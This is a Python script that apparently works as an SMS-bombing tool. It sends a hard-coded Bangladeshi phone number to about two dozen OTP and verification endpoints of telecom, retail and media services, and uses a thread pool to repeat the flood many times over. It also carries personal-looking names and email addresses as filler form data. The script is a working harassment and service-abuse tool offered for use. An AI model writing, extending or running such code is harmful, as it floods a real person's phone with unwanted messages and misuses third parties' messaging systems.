import requests
import time
# import threading
from concurrent.futures import ThreadPoolExecutor

# -------URLs and Data Setup-------#
number = +8801709143290 # +88
rangex = int("10")
mnumber = str(number)
number2 = mnumber[2:]
number3 = mnumber[3:]
mnumber2 = int(number2)

requests_data = [
    ("https://weblogin.grameenphone.com/backend/api/v1/otp", {'msisdn': number}),
    ("https://api.osudpotro.com/api/v1/users/send_otp", {'mobile': number, 'deviceToken': 'web', 'language': 'en', 'os': 'web'}),
    ("https://api.chardike.com/api/otp/send", {'phone': number, 'otp_type': 'login'}),
    ("https://webapi.robi.com.bd/v1/account/register/otp", {'phone_number': number}),
    ("https://member.daraz.com.bd/user/api/sendVerificationSms?_bx-v=2.5.11", {'phone': number, 'deliveryType': 'SMS', 'type': 'OTP_REGISTER', 'lzdAppVersion': '1.0'}),
    ("https://accountkit.sheba.xyz/api/shoot-otp", {'mobile': number, 'app_id': '8329815A6D1AE6DD'}),
    ("https://cokestudio23.sslwireless.com/api/store-and-send-otp", {'msisdn': number, 'name': 'Aulad Hosen', 'email': 'uladhosenridoy@gmail.com', 'dob': '2000-01-01', 'occupation': 'N/A', 'gender': 'male'}),
    ("https://cokestudio23.sslwireless.com/api/check-gp-number", {'msisdn': number2}),
    ("https://fundesh.com.bd/api/auth/generateOTP?service_key=", {'msisdn': number3}),
    ("https://api.swap.com.bd/api/v1/send-otp", {'phone': number2}),
    ("https://api.paragonfood.com.bd/auth/customerlogin", {'emailOrPhone': number}),
    ("https://prod-api.viewlift.com/identity/signup?site=prothomalo", {'requestType': 'send', 'phoneNumber': number, 'emailConsent': 'true', 'whatsappConsent': 'false'}),
    ("https://prod-api.viewlift.com/identity/signup?site=hoichoitv", {'requestType': 'send', 'phoneNumber': number, 'emailConsent': 'true', 'whatsappConsent': 'true'}),
    ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {'full_name': 'Hjbdnd', 'company_name': 'Hello', 'email_address': 'uladhosen860@gmail.com', 'phone_number': number2}),
    ("https://developer.quizgiri.xyz/api/v2.0/send-otp", {'country_code': '+880', 'phone': number2}),
    ("https://api.shikho.com/auth/v2/send/sms", {'auth_type': 'login', 'phone': number2, 'vendor': 'shikho', 'type': 'student'})
]

# -------Run Function-------#
def runx():
    session = requests.Session()
    urls = [
        f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number2}",
        f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number2}",
        f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={number2}",
        f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number2}",
        f"https://www.rokomari.com/login/check?emailOrPhone=88{mnumber2}",
        f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={mnumber2}",
        f"https://www.rokomari.com/login/check?emailOrPhone=88{mnumber2}",
        f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={number2}",
        f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={number2}",
        f"https://ultranetrn.com.br/fonts/api.php?number={number2}",
        f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={number2}",
    ]

    for url in urls:
        session.get(url)

    for url, data in requests_data:
        session.post(url, data=data)

    responses = [session.post(url, data=data) for url, data in requests_data]
    status_codes = [response.status_code for response in responses]

    for code in status_codes:
        print(code)

# -------Main Function-------#
def main():
    with ThreadPoolExecutor(max_workers=20) as executor:
        for _ in range(rangex):
            futures = [executor.submit(runx) for _ in range(15)]
            for future in futures:
                future.result()
            # time.sleep(1)

if __name__ == "__main__":
    main()
